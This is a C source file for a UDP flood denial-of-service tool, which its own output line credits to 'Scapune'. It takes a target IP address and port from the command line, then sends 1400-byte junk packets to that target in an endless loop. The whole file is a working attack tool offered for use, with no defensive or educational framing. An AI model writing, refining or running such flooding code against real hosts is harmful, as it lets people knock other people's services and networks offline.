#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// 1400 bytes maximizes bandwidth efficiency per packet
#define PAYLOAD_SIZE 1400 

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int port = atoi(argv[2]);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    char payload[PAYLOAD_SIZE];
    memset(payload, 'O', PAYLOAD_SIZE);

    printf("Starting attack to %s:%d. DoS tool made by Scapune in C :3\n", target_ip, port);

    while (1) {
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
    return 0;
}
